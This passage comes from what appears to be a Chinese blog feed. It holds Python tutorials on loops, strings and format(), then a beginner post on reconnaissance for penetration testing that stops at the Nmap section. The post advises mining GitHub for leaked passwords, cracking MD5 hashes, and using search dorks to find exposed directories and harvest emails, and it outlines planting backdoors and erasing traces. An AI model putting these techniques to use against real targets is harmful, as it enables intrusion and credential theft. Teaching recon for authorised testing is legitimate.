&lt;语句块2&gt;</code></pre><p>在这种扩展模式中，else语句只在循环正常执行后才执行。</p><pre><code class="python">s, idx = &quot;BIT&quot;, 0while idx &lt; len(s):    print(&quot;循环进行中：&quot; + s[idx])    idx += 1else:    s = &quot;循环正常结束&quot;print(s)</code></pre><p>执行结果：</p><pre><code class="python">循环进行中：B循环进行中：I循环进行中：T循环正常结束&gt;&gt;&gt; </code></pre><p>（3）若要通过while实现一个计数循环，则需在循环之前对计数器idx进行初始化，并在每次循环中对计数器idx进行累加。而for循环中循环变量逐一取自遍历结构，不需要程序维护计数器。</p><h3 id="循环保留字：break和continue"><a href="#循环保留字：break和continue" class="headerlink" title="循环保留字：break和continue"></a>循环保留字：break和continue</h3><p>（1）这两个保留字用来辅助控制循环执行。</p><p>（2）break用来跳出最内层for或while循环，脱离该循环后程序从循环代码后继续执行，例如：</p><pre><code class="python">for s in &quot;BIT&quot;:    for i in range(10):        print(s, end=&quot;&quot;)        if s==&quot;I&quot;:            break</code></pre><p>执行结果：</p><pre><code class="python">BBBBBBBBBBITTTTTTTTTT&gt;&gt;&gt;</code></pre><p>其中，break语句跳出了最内层for循环，单仍然继续执行外层循环，每个break语句只能跳出当前层次循环。</p><p>（3）continue用来结束当前当次循环，即跳过循环体中下面还没执行的语句，但不跳出循环。</p><pre><code class="python">for s in &quot;Python&quot;:    if s == &quot;t&quot;:        continue    print(s, end=&quot;&quot;)</code></pre><p>执行结果：</p><pre><code class="python">Pyhon&gt;&gt;&gt; </code></pre><p>（4）for循环和while循环中都存在else扩展用法，else语句只在一种情况下执行，即循环正常遍历了所有内容或由于条件不成立而结束循环，没有因为break或return而退出循环。若有break或return则不执行else，continue保留字对else没有影响。</p><pre><code class="python">#continuefor s in &quot;Python&quot;:    if s == &quot;t&quot;:        continue    print(s, end=&quot;&quot;)else:    print(&quot;正常退出&quot;)</code></pre><p>执行结果：</p><pre><code>Pyhon 正常退出&gt;&gt;&gt; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(二)-基本数据类型02</title>
      <link href="2020/11/29/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/"/>
      <url>2020/11/29/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/</url>
      
        <content type="html"><![CDATA[<h2 id="字符串类型及其操作"><a href="#字符串类型及其操作" class="headerlink" title="字符串类型及其操作"></a>字符串类型及其操作</h2><p>要点：字符串是字符的序列表示，可以通过基本的字符串操作符、内置字符串处理函数和字符串处理方法等对字符串进行操作。</p><h3 id="字符串类型的表示"><a href="#字符串类型的表示" class="headerlink" title="字符串类型的表示"></a>字符串类型的表示</h3><p>（1）字符串可以由一对单引号(‘)、双引号(“)或三引号(“‘)构成。其中，单引号和双引号都可以表示单行字符串，两者作用相同。三引号可以表示单行或者多行字符串。</p><table><thead><tr><th>表示方法</th><th>可行操作</th></tr></thead><tbody><tr><td>单引号字符串</td><td>可以使用双引号作为字符串的一部分</td></tr><tr><td>双引号字符串</td><td>可以使用单引号作为字符串的一部分</td></tr><tr><td>三引号字符串</td><td>可以使用双引号、单引号，也可以换行</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; print(&#39;我爱&quot;中国&quot;这个伟大的国家&#39;)我爱&quot;中国&quot;这个伟大的国家&gt;&gt;&gt; print(&quot;她有着&#39;960万平方公里&#39;的土地&quot;)她有着&#39;960万平方公里&#39;的土地&gt;&gt;&gt; print(&#39;&#39;&#39;她还有&quot;14亿&quot;的人口是&#39;世界第二大经济体&#39;&#39;&#39;&#39;)她还有&quot;14亿&quot;的人口是&#39;世界第二大经济体&#39;&gt;&gt;&gt; </code></pre><p>（2）input()函数将用户的输入内容当做一个字符串类型，print()函数可以直接打印字符串。</p><pre><code class="Python">&gt;&gt;&gt;name = input(&quot;请输入名字：&quot;)请输入名字：Python&gt;&gt;&gt;print(name)Python</code></pre><p>（3）字符串以Unicode编码存储，因此，字符串的英文字符和中文字符都算作1个字符。</p><pre><code class="python">&gt;&gt;&gt; name = &quot;Python语言程序设计&quot;&gt;&gt;&gt; print(name[0], name[7], name[-1])P 言 计&gt;&gt;&gt; print(name[2:-4])thon语言&gt;&gt;&gt; print(name[:6])Python&gt;&gt;&gt; print(name[6:])语言程序设计&gt;&gt;&gt; print(name[:])Python语言程序设计</code></pre><p>（4）反斜杠字符\是一个特殊字符，在字符串中表示转义，即该字符与后面相邻的一个字符共同组成了新的含义。例如，\n表示换行、\\表示反斜杠、\‘表示单引号、\“表示双引号、\t表示制表符(Tab)等。例如：</p><pre><code class="python">&gt;&gt;&gt; print(&quot;Python\n语言\t程序\t设计&quot;)Python语言    程序    设计</code></pre><h3 id="基本的字符串操作符"><a href="#基本的字符串操作符" class="headerlink" title="基本的字符串操作符"></a>基本的字符串操作符</h3><p>（1）5个基本的字符串操作符</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x + y</td><td align="center">连接两个字符串x与y</td></tr><tr><td align="center">x * n 或 n * x</td><td align="center">复制n次字符串x</td></tr><tr><td align="center">x in s</td><td align="center">如果x是s的子串，返回True，否则返回False</td></tr><tr><td align="center">str[i]</td><td align="center">索引，返回第i个字符</td></tr><tr><td align="center">str[N:M]</td><td align="center">切片，返回索引第N到第M的子串，其中不包含M</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; &quot;Python语言&quot; + &quot;程序设计&quot;&#39;Python语言程序设计&#39;&gt;&gt;&gt; name = &quot;Python语言&quot; + &quot;程序设计&quot; + &quot;基础&quot;&gt;&gt;&gt; name&#39;Python语言程序设计基础&#39;&gt;&gt;&gt; &quot;Python语言&quot; in nameTrue&gt;&gt;&gt; &quot;good&quot; in nameFalse&gt;&gt;&gt; &quot;good!&quot; * 3&#39;good!good!good!&#39;</code></pre><p>（2）获取星期字符串，例如：输入3，返回“星期三”。</p><pre><code class="python">weekstr = &quot;星期一星期二星期三星期四星期五星期六星期日&quot;weekid = eval(input(&quot;请输入星期数字(1-7)：&quot;))pos = (weekid - 1)*3print(weekstr[pos:pos+3])</code></pre><p>运行结果：</p><pre><code class="python">&gt;&gt;&gt;请输入星期数字(1-7)：3星期三</code></pre><h3 id="内置的字符串处理函数"><a href="#内置的字符串处理函数" class="headerlink" title="内置的字符串处理函数"></a>内置的字符串处理函数</h3><p>（1）共6个</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">len(x)</td><td align="center">返回字符串x的长度，也可返回其他组合数据类型元素个数</td></tr><tr><td align="center">str(x)</td><td align="center">返回任意类型x所对应的字符串形式</td></tr><tr><td align="center">chr(x)</td><td align="center">返回Unicode编码x对应的单字符</td></tr><tr><td align="center">ord(x)</td><td align="center">返回单字符表示的Unicode编码</td></tr><tr><td align="center">hex(x)</td><td align="center">返回整数x对应十六进制数的小写形式字符串</td></tr><tr><td align="center">oct(x)</td><td align="center">返回整数x对应八进制数的小写形式字符串</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; len(&quot;Python语言程序设计&quot;)12&gt;&gt;&gt; str(3.1415926)&#39;3.1415926&#39;</code></pre><p>（2）Python字符串中每个字符都是用Unicode编码表示，因为相比ASCII编码，Unicode编码能支持几乎所有书写语言的字符。chr()和ord()函数用于在单字符和Unicode编码值之间进行转换。</p><pre><code class="python">&gt;&gt;&gt; &quot;1 + 1 = 2 &quot; + chr(10004)&#39;1 + 1 = 2 ✔&#39;&gt;&gt;&gt; &quot;金牛座字符♉对应的Unicode值：&quot; + str(ord(&quot;♉&quot;))&#39;金牛座字符♉对应的Unicode值：9801&#39;</code></pre><p>（3）凯撒密码，采用了替换方法，对信息中的每一个英文字符循环替换为字母表序列中该字符后面第三个字符。</p><p>设明文为P,密文为C，则满足：</p><pre><code class="python">加密:C = (P+3) mod 26解密:P = (C-3) mod 26</code></pre><pre><code class="Python">#加密，使用的信息仅包含小写字母plaincode = input(&quot;请输入明文：&quot;)for p in plaincode:    if ord(&quot;a&quot;) &lt;= ord(p) &lt;= ord(&quot;z&quot;):        print(chr(ord(&quot;a&quot;) + (ord(p) - ord(&quot;a&quot;) + 3)%26), end=&#39;&#39;)    else:        print(p, end=&#39; &#39;)#解密plaincode = input(&quot;请输入密文：&quot;)for c in plaincode:    if ord(&quot;a&quot;) &lt;= ord(c) &lt;= ord(&quot;z&quot;):        print(chr(ord(&quot;a&quot;) + (ord(c) - ord(&quot;a&quot;) - 3)%26), end=&#39;&#39;)    else:        print(c, end=&#39;&#39;)</code></pre><pre><code class="python">#加密结果&gt;&gt;&gt;请输入明文：python is an excellent language.sbwkrq  lv  dq  hafhoohqw  odqjxdjh. #解密结果&gt;&gt;&gt;请输入密文：sbwkrq  lv  dq  hafhoohqw  odqjxdjh.python  is  an  excellent  language.</code></pre><h3 id="内置的字符串处理方法"><a href="#内置的字符串处理方法" class="headerlink" title="内置的字符串处理方法"></a>内置的字符串处理方法</h3><p>（1）在Python解释器内部，所有数据类型都采用面向对象方式实现，封装为一个类。字符串也是一个类，具有类似&lt;a&gt;.&lt;b&gt;()形式的字符串处理函数。在面向对象中，这类函数也被称为“方法”。str为字符串</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">str.lower()</td><td align="center">返回字符串str的副本，全部字符小写</td></tr><tr><td align="center">str.upper()</td><td align="center">返回字符串str的副本，全部字符大写</td></tr><tr><td align="center">str.islower()</td><td align="center">当str所有字符都是小写时，返回True，否则返回False</td></tr><tr><td align="center">str.isprintable()</td><td align="center">当str所有字符都是可打印的，返回True，否则返回False</td></tr><tr><td align="center">str.isnumeric()</td><td align="center">当str所有字符都是数字时，返回True，否则返回False</td></tr><tr><td align="center">str.isspace()</td><td align="center">当str所有字符都是空格时，返回True，否则返回False</td></tr><tr><td align="center">str.split(sep=None,maxsplit=-1)</td><td align="center">返回一个列表，由str根据sep被分隔的部分构成</td></tr><tr><td align="center">str.center(width[,fillchar])</td><td align="center">字符串居中函数</td></tr><tr><td align="center">str.zfill(width)</td><td align="center">返回字符串str的副本，长度为width，不足部分在左侧添0</td></tr></tbody></table><p>（2）str.split(sep=None,maxsplit=-1)方法返回一个列表，列表是一种存储多个数据的数据类型。其中，分隔str的标识符是sep，默认分隔符为空格。若给出参数maxsplit，则只分隔前maxsplit个字符，该参数默认可不给出。</p><pre><code class="python">&gt;&gt;&gt; &quot;Python is an excellent language.&quot;.split()[&#39;Python&#39;, &#39;is&#39;, &#39;an&#39;, &#39;excellent&#39;, &#39;language.&#39;]</code></pre><p>（3）str.center(width[,fillchar])方法返回长度为width的字符串。其中，str处于新字符串中心位置，两侧用新增字符fillchar填充。当width小于字符串长度时，返回str。</p><pre><code class="python">&gt;&gt;&gt; &quot;python&quot;.center(40,&#39;=&#39;)&#39;=================python=================&#39;</code></pre><p>（4）str.zfill(width)方法返回长度为width的字符串，若字符串长度不足width，在左侧添加字符”0”。但如果str最左侧是字符”+”或者”-“，则从第二个字符左侧添加”0”。同样，若width小于字符串长度，则返回str。</p><pre><code class="python">&gt;&gt;&gt; &quot;123&quot;.zfill(40)&#39;0000000000000000000000000000000000000123&#39;&gt;&gt;&gt; &quot;-123&quot;.zfill(40)&#39;-000000000000000000000000000000000000123&#39;</code></pre><h2 id="字符串类型的格式化"><a href="#字符串类型的格式化" class="headerlink" title="字符串类型的格式化"></a>字符串类型的格式化</h2><p>（1）要点：字符串通过format()方法进行格式化处理。</p><p>（2）字符串是程序向控制台、网络、文件等介质输出运算结果的主要形式之一，字符串类型的格式化有助于提供更好的可读性和灵活性。</p><h3 id="format-方法的基本使用"><a href="#format-方法的基本使用" class="headerlink" title="format()方法的基本使用"></a>format()方法的基本使用</h3><p>（1）基本使用格式：&lt;模板字符串&gt;.format(&lt;逗号分隔的参数&gt;)</p><p>（2）模板字符串由一系列槽组成，用来将format()方法中逗号分隔的参数按照序号关系替换到模板字符串的槽中。</p><p>（3）槽用大括号{}表示。若大括号中没有序号，则按照出现顺序替换；若大括号中指定了使用参数的序号，则按照序号对应的参数替换。序号从0开始编号。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;&#125;：计算机&#123;&#125;的CPU占用率为&#123;&#125;%。&quot;.format(&quot;2020-11-30&quot;,&quot;python&quot;,&quot;10&quot;) #按出现顺序0,1，2替换&#39;2020-11-30：计算机python的CPU占用率为10%。&#39;</code></pre><p>（4）format()方法可以连接不同类型的变量或内容。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;&#125;&#123;&#125;&#123;&#125;&quot;.format(&quot;圆周率是&quot;,3.1415926,&quot;...&quot;)&#39;圆周率是3.1415926...&#39;&gt;&gt;&gt; &quot;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&quot;.format(&quot;无理数&quot;,3.1415926,&quot;...&quot;)&#39;圆周率&#123;3.1415926...&#125;是无理数&#39;&gt;&gt;&gt; s=&quot;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&quot;           #大括号本身是字符串的一部分&gt;&gt;&gt; s&#39;圆周率&#123;&#123;&#123;1&#125;&#123;2&#125;&#125;&#125;是&#123;0&#125;&#39;&gt;&gt;&gt; s.format(&quot;无理数&quot;,3.1415926,&quot;...&quot;)  #当调用format()时解析大括号&#39;圆周率&#123;3.1415926...&#125;是无理数&#39;</code></pre><h3 id="format-方法的格式控制"><a href="#format-方法的格式控制" class="headerlink" title="format()方法的格式控制"></a>format()方法的格式控制</h3><p>（1）format()方法中模本字符串的槽除了包括参数序号，还可以包括格式控制信息。其中，格式控制标记可以用来控制参数显示时的格式。槽内部信息如下：</p><pre><code>&#123;&lt;参数信号&gt;: &lt;格式控制标记&gt;&#125;</code></pre><table><thead><tr><th align="center">格式控制标记</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">:</td><td align="center">引导符号</td></tr><tr><td align="center">&lt;填充&gt;</td><td align="center">用于填充单个字符</td></tr><tr><td align="center">&lt;对齐&gt;</td><td align="center">&lt; 左对齐、&gt;右对齐、^居中对齐</td></tr><tr><td align="center">&lt;宽度&gt;</td><td align="center">槽的设定输出宽度</td></tr><tr><td align="center">&lt;,&gt;</td><td align="center">数字的千分分隔符，适用于整数和浮点数</td></tr><tr><td align="center">&lt;.精度&gt;</td><td align="center">浮点数小数部分的精度或字符串的最大输出长度</td></tr><tr><td align="center">&lt;类型&gt;</td><td align="center">整数类型b，c，d，o，x，X；浮点数类型e，E，f，%</td></tr></tbody></table><p>（2）&lt;宽度&gt;指当前槽的设定输出字符宽度，如果该槽对应的format()参数长度比&lt;宽度&gt;大，则使用参数实际长度；若该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。</p><pre><code class="python">&gt;&gt;&gt;s=&quot;python&quot;&gt;&gt;&gt; &quot;&#123;0:30&#125;&quot;.format(s)           #默认左对齐&#39;python                        &#39;&gt;&gt;&gt; &quot;&#123;0:3&#125;&quot;.format(s)            #参数比宽度大，直接输出字符实际长度 &#39;python&#39;</code></pre><p>（3）&lt;对齐&gt;指参数在宽度内输出时的对齐方式。&lt;填充&gt;指宽度内除了参数外的字符采用什么方式表示，默认采用空格，可以通过填充更换。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:&gt;30&#125;&quot;.format(s)             #右对齐&#39;                        python&#39;&gt;&gt;&gt; &quot;&#123;0:*^30&#125;&quot;.format(s)            #居中对齐且使用*填充&#39;************python************&#39;</code></pre><p>（4）格式控制标记中的逗号(,)用于显示数字类型的千位分隔符。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:-^20,&#125;&quot;.format(1234567890)&#39;---1,234,567,890----&#39;&gt;&gt;&gt; &quot;&#123;0:-^20,&#125;&quot;.format(12345.67890)&#39;----12,345.6789-----&#39;</code></pre><p>（5）&lt;.精度&gt;表示两个含义，由小数点(.)开头。对于浮点数，精度表示小数部分输出的有效位。对于字符串，精度表示最大输出长度。</p><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:.2f&#125;&quot;.format(12345.67890)&#39;12345.68&#39;&gt;&gt;&gt; &quot;&#123;0:.4&#125;&quot;.format(&quot;python&quot;)&#39;pyth&#39;</code></pre><p>（6）&lt;类型&gt;表示输出整数和浮点数类型的格式规则。</p><table><thead><tr><th align="center">整数类型输出格式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">b</td><td align="center">输出整数的二进制方式</td></tr><tr><td align="center">c</td><td align="center">输出整数对应的Unicode字符</td></tr><tr><td align="center">d</td><td align="center">输出整数的十进制方式</td></tr><tr><td align="center">o</td><td align="center">输出整数的八进制方式</td></tr><tr><td align="center">x</td><td align="center">输出整数的小写十六进制方式</td></tr><tr><td align="center">X</td><td align="center">输出整数的大写十六进制方式</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:b&#125;,&#123;0:c&#125;,&#123;0:d&#125;,&#123;0:o&#125;,&#123;0:x&#125;,&#123;0:X&#125;&quot;.format(425)&#39;110101001,Ʃ,425,651,1a9,1A9&#39;</code></pre><table><thead><tr><th align="center">浮点数类型输出格式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">e</td><td align="center">输出浮点数对应的小写字母e的指数形式</td></tr><tr><td align="center">E</td><td align="center">输出浮点数对应的大写字母e的指数形式</td></tr><tr><td align="center">f</td><td align="center">输出浮点数的标准浮点形式</td></tr><tr><td align="center">%</td><td align="center">输出浮点数的百分形式</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; &quot;&#123;0:.2e&#125;,&#123;0:.2E&#125;,&#123;0:.2f&#125;,&#123;0:.2%&#125;&quot;.format(3.14)&#39;3.14e+00,3.14E+00,3.14,314.00%&#39;</code></pre><h2 id="实例：文本进度条"><a href="#实例：文本进度条" class="headerlink" title="实例：文本进度条"></a>实例：文本进度条</h2><h3 id="非刷新文本进度条"><a href="#非刷新文本进度条" class="headerlink" title="非刷新文本进度条"></a>非刷新文本进度条</h3><p>（1）按照任务执行百分比将整个任务划分为100个单位，每执行N%输出一次进度条。每一行输出包含进度百分比，代表已完成的部分(**)和未完成的部分(..)的两种字符，以及一个跟随完成度前进的小箭头。</p><p>（2）由于直接进行字符输出几乎是瞬间完成，为了便于观察，调用Python标准时间库time，使用time.sleep()函数将当前程序暂时挂起为t秒，t可以是小数。以此模拟进度条效果输出。</p><pre><code class="python">import timescale = 10                              #scale表示输出进度条的精度，修改后会有不同的效果print(&quot;------执行开始------&quot;)             #print()函数在输出结尾处会自动产生一个&#39;\n&#39;，即换行符for i in range(scale+1):    a, b = &#39;**&#39; * i, &#39;..&#39; * (scale - i)    c = (i/scale)*100    print(&quot;%&#123;:^3.0f&#125;[&#123;&#125;-&gt;&#123;&#125;]&quot;.format(c, a, b))    time.sleep(0.1)print(&quot;------执行结束------&quot;)</code></pre><p>（3）运行结果：</p><pre><code class="python">&gt;&gt;&gt;------执行开始------% 0 [-&gt;....................]%10 [**-&gt;..................]%20 [****-&gt;................]%30 [******-&gt;..............]%40 [********-&gt;............]%50 [**********-&gt;..........]%60 [************-&gt;........]%70 [**************-&gt;......]%80 [****************-&gt;....]%90 [******************-&gt;..]%100[********************-&gt;]------执行结束------</code></pre><h3 id="单行动态刷新"><a href="#单行动态刷新" class="headerlink" title="单行动态刷新"></a>单行动态刷新</h3><p>（1）将每一次精度输出都固定在同一行，不断用新生成的字符串覆盖之前的输出，形成单行动态刷新的效果。</p><p>（2）采用print()函数，在该函数中更换参数end的默认值为’’，即每次使用print()函数输出时不换行。此时，系统输出指针还停留在上一次输出的行尾，下一次输出在字符串前部增加转义符’\r’,该转义符把输出指针移动到行首而不换行。</p><pre><code class="python">import timefor i in range(101):    print(&quot;\r&#123;:3&#125;%&quot;.format(i),end=&#39;&#39;)    time.sleep(0.05)</code></pre><p>（3）运行结果：</p><p><img src="https://i.loli.net/2020/11/30/YB5wiGKdHyn2LWz.png" alt="image-20201130190704002"></p><p>（4）由于IDLE本身屏蔽了单行刷新功能，所以运行结果并没有出现单行刷新。若要获得刷新效果，选择到e4.2TextProgressBar.py文件所在目录，使用命令行工具cmd执行如下命令:</p><pre><code>python e4.2TextProgressBar.py</code></pre><p>也可使用PyCharm运行这个单行动态刷新程序，可直接看到单行刷新效果。</p><p><img src="https://i.loli.net/2020/11/30/Y2vryMeVR9ZwTtF.png" alt="image-20201130192609421"></p><h3 id="带刷新的文本进度条"><a href="#带刷新的文本进度条" class="headerlink" title="带刷新的文本进度条"></a>带刷新的文本进度条</h3><p>（1）在文本进度条中增加运行时间的监控。</p><p>（2）这里采用time库中的time.clock()函数。time.clock()函数一般多次出现，第一次调用时计时开始，同一程序中第二次及后续调用时返回与第一次计时之间的时间差，单位为秒。该函数主要用来统计程序运行时间，增加用户体验。</p><pre><code class="python">import timescale = 50print(&quot;执行开始&quot;.center(scale // 2,&#39;-&#39;))t = time.clock()for i in range(scale+1):    a = &#39;*&#39; * i    b = &#39;.&#39; * (scale-i)    c = (i/scale)*100    t = time.clock() - t    print(&quot;\r&#123;:^3.0f&#125;%[&#123;&#125;-&gt;&#123;&#125;]&#123;:.2f&#125;s&quot;.format(c, a, b, t), end=&#39;&#39;)    time.sleep(0.05)print(&quot;\n&quot;+&quot;执行结束&quot;.center(scale // 2,&#39;-&#39;))</code></pre><p>（3）在PyCharm中运行结果：</p><p><img src="https://i.loli.net/2020/11/30/nTDRXCghKbp6xHf.png" alt="image-20201130195623749"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集技术</title>
      <link href="2020/11/28/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/"/>
      <url>2020/11/28/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>（1）渗透测试，是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。</p><p>（2）黑客攻击模型(渗透测试思路）：</p><table><thead><tr><th align="center">操作</th><th align="center">目的</th></tr></thead><tbody><tr><td align="center">踩点</td><td align="center">信息收集(前提)</td></tr><tr><td align="center">定位</td><td align="center">分析目标，寻找漏洞:系统漏洞(ms17-010)、web漏洞(sql、xss)</td></tr><tr><td align="center">入侵</td><td align="center">利用漏洞，通过工具或构造攻击代码(payload)实施攻击，获取权限(shell界面)</td></tr><tr><td align="center">上传木马文件(留后门)或病毒</td><td align="center">方便再次进入或实施破坏</td></tr><tr><td align="center">抹去痕迹</td><td align="center">清理入侵记录</td></tr></tbody></table><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集，俗称踩点，是渗透测试的前提，也是最重要的阶段之一。为了启动渗透测试，用户需要收集关于目标网络资产等信息。用户得到的信息越多，渗透测试成功的概率也就越高。</p><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><p>（1）whois协议，用来查询域名是否已经被注册，以及注册域名的详细信息的数据库(如域名所有人、域名注册商)。在线查询工具：站长之家<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>（2）子域名，是顶级域名(.com、.cn、.top)的下一级，域名整体包括两个”.”或包括一个”/“。例如：百度的顶级域名为baidu.com。其下的子域名有：news.baidu.com、tieba.baidu.com、zhidao.baidu.com……收集子域名可以很大程度知道目标所拥有的网站等资产信息。</p><p>（3）子域名查询在线工具：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a>。其他工具：FuzzDomain、子域名挖掘机</p><h3 id="旁站C段"><a href="#旁站C段" class="headerlink" title="旁站C段"></a>旁站C段</h3><p>（1）查询旁站指某个服务器同一个IP地址的所有域名</p><p>（2）查询C段指某个服务器IP地址所在C段IP地址的所有域名</p><p>（3）注释：IP地址：A段.B段.C段.D段 C段查询就是ABC段相同，D段不同的IP地址下的所有域名；旁站查询是同IP地址下的所有域名。<br>例：旁站查询：192.168.193.2的所有域名，C段查询：192.168.193.0同网段下的所有域名</p><p>（3）在线查询工具：<a href="https://chapangzhan.com/">https://chapangzhan.com</a></p><h3 id="征信查询"><a href="#征信查询" class="headerlink" title="征信查询"></a>征信查询</h3><p>（1）企业征信机构记录了一家企业的基本信息，历史沿革，股东及出资等信息的平台。</p><p>（2）查询：<a href="https://icredit.jd.com/">https://icredit.jd.com</a>、天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com</a></p><h3 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h3><p>（1）获取域名或者IP地址，并进行反向查找以快速显示同一服务器承载的所有其他域。</p><p>（2）查询：Viewdns：<a href="http://viewdns.info/">http://viewdns.info</a>、DNSdb：<a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> 也可用命令nslookup [域名]</p><h3 id="IP查询"><a href="#IP查询" class="headerlink" title="IP查询"></a>IP查询</h3><p>（1）根据IP地址查询同一IP地址的其他信息</p><p>（2）在线查询：114best：<a href="http://www.114best.com/">http://www.114best.com</a></p><h3 id="备案号查询"><a href="#备案号查询" class="headerlink" title="备案号查询"></a>备案号查询</h3><p>（1）备案号是网站是否合法注册经营的标志，一个网站域名要上线必然要经过备案程序，通过备案号反查可查询目标的所有合法网站。</p><p>（2）在线查询：<a href="http://icp.chinaz.com/">http://icp.chinaz.com</a></p><h3 id="密码收集"><a href="#密码收集" class="headerlink" title="密码收集"></a>密码收集</h3><p>（1）gitHub是全球最大的面向开源及私有软件项目的托管平台。许多企业的开发人员在上传开源代码到github往往忽略了将密码等敏感信息删除导致信息泄露。</p><p>（2）在github上搜索网站及关键字，在Code中查看。通常查看到的密码都使用了MD5加密，可用在线工具进行破解。 <a href="https://github.com/">github.com</a></p><p><img src="https://i.loli.net/2020/11/29/xUcBnq5HYrawLOJ.png" alt="image-20201129121609316"></p><h3 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google hacking"></a>Google hacking</h3><p>（1）搜索引擎都会提供相应搜索语法，通过搜索语法可以快速得到想要的信息。</p><p>（2）推荐搜索引擎：必应：bing.com、百度：baidu.com、谷歌：google.com</p><p>（3）推荐语法：</p><table><thead><tr><th align="center">语法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">Intitle:</td><td align="center">搜索网站标题含有的关键字</td></tr><tr><td align="center">Inurl:</td><td align="center">搜索url含有的关键字</td></tr><tr><td align="center">Intext:</td><td align="center">搜索网页正文含有的关键字</td></tr><tr><td align="center">Site:</td><td align="center">搜索特定网站和网站域名</td></tr><tr><td align="center">Filetype:</td><td align="center">搜索特定文档格式</td></tr></tbody></table><pre><code>intitle:&quot;index of&quot;        //搜索网站目录泄露页面intext:京ICP备09031924号   //备案号查询intext:&quot;@163.com&quot;         //邮箱搜集</code></pre><p><img src="https://i.loli.net/2020/11/28/nUJAZcvkyDB7d24.png" alt="image-20201128215731922"></p><p><img src="https://i.loli.net/2020/11/28/dLP9H6cIqkbnjN7.png" alt="image-20201128214905209"></p><p>（4）URL采集器：快速切换搜索引擎，快速获得搜索结果</p><p><img src="https://i.loli.net/2020/12/01/tH5kBC9zT7DQueR.png" alt="image-20201201223132842"></p><h2 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h2><p>（1）端口扫描通常使用专门的端口扫描工具来进行。可以详细收集目标开放的端口、服务、应用版本、操作系统、活跃主机等多种信息。</p><p>（2）端口扫描流程：</p><table><thead><tr><th align="center">扫描流程(按顺序)</th><th align="center">相关操作</th></tr></thead><tbody><tr><td align="center">存活判断</td><td align="center">Ping、TCP扫描、UDP扫描</td></tr><tr><td align="center">端口扫描</td><td align="center">TCP扫描、UDP扫描</td></tr><tr><td align="center">服务识别</td><td align="center">基于端口、基于banner、基于指纹</td></tr></tbody></table><p>（3）端口探测技术，一般通过发送建立连接过程涉及的相关报文，根据返回包的情况来判断目标端口是否开放。主流的扫描方式有：利用TCP面向连接三次握手、四次挥手过程包，UDP非面向连接请求</p><p>（4）服务识别技术，用于识别端口上运行的服务。识别方式有三种，实际使用通常需要相互配合使用</p><table><thead><tr><th align="center">识别方式</th><th align="center">判断方式</th><th align="center">准确率</th><th align="center">效率</th></tr></thead><tbody><tr><td align="center">基于端口</td><td align="center">根据端口默认运行的服务进行判断</td><td align="center">低</td><td align="center">高</td></tr><tr><td align="center">基于banner</td><td align="center">根据访问端口获取的欢迎界面来判断</td><td align="center">中</td><td align="center">高</td></tr><tr><td align="center">基于指纹</td><td align="center">根据不同系统不同服务具有不同的TCP/IP协议栈来判断</td><td align="center">高</td><td align="center">低</td></tr></tbody></table><p>banner：访问一个主机端口时，该端口所运行的服务有时会返回对应服务和版本号。</p><p><img src="https://i.loli.net/2020/11/28/DIPsx5gLSfU2ETn.png" alt="image-20201128222945585"></p><h2 id="Nmap端口扫描器"><a href="#Nmap端口扫描器" class="headerlink" title="Nmap端口扫描器"></a>Nmap端口扫描器</h2><p>（1）诸神之眼——Nmap(Network 